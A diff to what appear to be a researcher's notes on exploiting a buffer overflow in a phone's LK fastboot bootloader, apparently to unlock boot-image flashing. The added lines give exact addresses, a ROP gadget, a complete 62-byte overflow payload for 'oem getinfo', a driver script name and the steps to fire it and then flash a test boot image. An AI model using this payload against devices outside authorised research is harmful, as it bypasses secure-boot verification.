@@ -44,23 +44,33 @@ testing it on hardware.
 
 ## Known-good facts for the exploit work
 
+* the dispatcher calls the command handler with `blx r3` at **0x2d7b8**, so at the
+  overflowed handler's return **lr = 0x2d7ba**, which is `b 0x2d778` — i.e. the
+  fastboot loop continuation. The handler's epilogue already restored sp, and the
+  dispatcher reloads r4/r7 from `[r5]`; **only r5 must survive**. No stack pivot
+  is needed.
 * hijack stack pointer from expdb panic dumps: `S = 0x4C79A410` (three dumps, identical)
 * payload window: `0x4C79A3E0 .. 0x4C79A40F`
-* wrapper frame: `[S]=4`, `[S+4]=0x5A5AA5A5`, `[S+8]=0x4C426E21`, `[S+12]=0x4C4D4DF0`, `E=S+0x10`
 * dispatcher r5 must be restored to `0x4C501CC4`
-* clean re-entry into the fastboot loop: `0x4C42D578` (0x2d778)
-* 18 `str rZ,[r4]; pop {pc}` gadgets exist (e.g. `0x4C401810`)
-* **no** stack pivot found: `sub sp,#0x20..0x38; pop{..,pc}` = 0, `mov sp,rX` = 0,
-  `ldr.w sp,[rX]` = 0
+* gadget (bytes inside a data table, but they decode as instructions):
+  `0x2f5b8: 62 66 07 00 00 20 70 47` =
+  `str r2,[r4,#0x64] ; lsls r7,r0,#0 ; movs r0,#0 ; bx lr`, VA `0x4C42F3B8`
+* payload (62 B): `"oem getinfo A "` + 36×`A` + `LE32(0x4C4C6A50)` +
+  `LE32(0x4C501CC4)` + `LE32(0x4C42F3B9)`, i.e. r4 = verify_global-0x64,
+  r5 = dispatcher state, lr = gadget|thumb. All bytes are free of NUL/space.
+* driver script: `lkfuzz/exploit_clear_verify.py` (`--dump` verified, `--fire` sends)
+* open question: whether r2 is 0 at the hijack (the panic dumps say 0). If it is
+  not, the store writes a non-zero value, LK survives, and another gadget can be
+  tried.
 
 ## Next actions (in order)
 
 1. **phone must be power-cycled** (hold power 15-20 s) — it is stuck in LK's
    download receive loop after an `oem ultraflash:boot` attempt.
-2. run `_research/scripts/test_ultraflash.py` — tries `oem ultraflash_en 1`
-   (the handler compares its argument against `" 1"`) then `fastboot flash boot`.
-3. if that fails: finish the ROP chain (needs a real pivot or a longer chain),
-   or find a new LK bug with an arbitrary-write primitive.
+2. `python -I lkfuzz/exploit_clear_verify.py --fire` (sends the BOF, checks LK is
+   still alive), then **in the same LK session**:
+   `fastboot flash boot boot_pd2048_test.img`.
+3. if r2 was not zero: try a gadget storing r1, or find another write primitive.
 4. independent of the gate: GSI on the `super` partition (fastbootd can write
    logical partitions) — keeps the stock kernel.
 
